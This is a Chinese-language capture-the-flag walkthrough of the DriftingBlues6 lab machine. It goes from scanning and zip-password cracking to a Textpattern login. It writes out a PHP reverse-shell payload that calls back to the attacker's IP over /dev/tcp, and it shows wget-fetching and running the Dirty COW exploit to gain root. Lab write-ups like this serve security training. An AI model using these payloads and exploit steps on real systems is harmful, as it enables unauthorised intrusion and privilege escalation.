# driftingblues6靶机

## 复现过程

### 信息搜集

1. 扫描网段下靶机ip `arp-scan -l`；

![image-20251124164337987](assets/image-20251124164337987.png)

2. 扫描靶机开放端口 `nmap -p- 192.168.1.74` 只开放了80端口；

![image-20251124164550311](assets/image-20251124164550311.png)

3. dirsearch扫描网站目录，使用操作机内置字典，`dirsearch -u 192.168.1.74 -e * -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -i 200`；

![image-20251124172106215](assets/image-20251124172106215.png)

4. 访问/robots.txt，发现登录路径；

![image-20251124165119468](assets/image-20251124165119468.png)

5. 访问/spammer，自动下载zip文件；

![image-20251124170741277](assets/image-20251124170741277.png)

6. 切换到下载文件所在目录，`cd  /root/下载/`，执行`zip2john spammer.zip >> passwd.txt`；

![image-20251124171219807](assets/image-20251124171219807.png)

7. 执行`john passwd.txt`命令，爆破出解压密码；

![image-20251124171347345](assets/image-20251124171347345.png)

8. 使用密码解压文件，`unzip spammer.zip`；

![image-20251124171558482](assets/image-20251124171558482.png)

9. 查看解压的文件，`cat creds.txt`，得到账号密码；

![image-20251124171721467](assets/image-20251124171721467.png)

10. 访问/textpattern/textpattern/登录页面，输入账号密码；

![image-20251124171913347](assets/image-20251124171913347.png)

11. 进入后找到file模块；

![image-20251124172016475](assets/image-20251124172016475.png)

12. 在这里可以上传文件；

![image-20251124174311145](assets/image-20251124174311145.png)

13. 查看操作机ip，为后续构造反弹shell做准备；

![image-20251124174142853](assets/image-20251124174142853.png)

14. 创建shell.php`vi shell.php`，进入编辑添加反弹shell语句。

    ```
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.27/4444 0>&1'");?>
    ```

![image-20251124173759849](assets/image-20251124173759849.png)

15. 写入后按ESC，输入`：wq`后回车保存；

![image-20251124173031462](assets/image-20251124173031462.png)

16. 回到上传文件页面，点击浏览；

![image-20251124174455506](assets/image-20251124174455506.png)

17. 选择我们创建好的shell文件；

![image-20251124173945771](assets/image-20251124173945771.png)

18. 点击upload；

![image-20251124174701578](assets/image-20251124174701578.png)

19. 上传成功；

![image-20251124174731595](assets/image-20251124174731595.png)

20. 在kali终端中开启监听；

![image-20251124175141425](assets/image-20251124175141425.png)

21. 访问文件存放目录/testpattern/files/；

![image-20251124174858598](assets/image-20251124174858598.png)

22. 点击shell.php，页面跳转；

![image-20251124175318812](assets/image-20251124175318812.png)

23. 成功反弹shell；

![image-20251124175415505](assets/image-20251124175415505.png)

### 提权过程

1. 查看内核信息，`uname -a`，该内核版本存在脏牛漏洞；

![image-20251124175615680](assets/image-20251124175615680.png)

2. 使用searchsploit搜索脏牛漏洞利用脚本，`searchsploit 40839`；

![image-20251124180531920](assets/image-20251124180531920.png)

3. 将脚本下载到本地，`searchsploit -m linux/local/40839.c`

![image-20251124180743207](assets/image-20251124180743207.png)

4. 开启http服务，`python3 -m http.server 8084`；

![image-20251124181244359](assets/image-20251124181244359.png)

5. 监听终端里切换到tmp目录，`cd /tmp`，将本地下载的脚本上传到靶机里；

   ```
   wget http://192.168.1.27:8084/40839.c
   ```

![image-20251124181748965](assets/image-20251124181748965.png)

6. 编译脚本，`gcc  -pthread 40839.c -o 40839 -lcrypt`，赋权`chmod 777 40839`,执行`./40839`，重置密码；

![image-20251124182604206](assets/image-20251124182604206.png)

7. 重置密码后重新反弹一次shell，再输入`python -c "import pty;pty.spawn('/bin/bash')"`开启虚拟终端，`su`切换用户，输入刚才的密码，成功提权；

![image-20251124183552801](assets/image-20251124183552801.png)

8. `cd /root`切换到root目录下`ls`查看，发现flag.txt文件，查看`cat flag.txt`，得到flag；

![image-20251124183819091](assets/image-20251124183819091.png)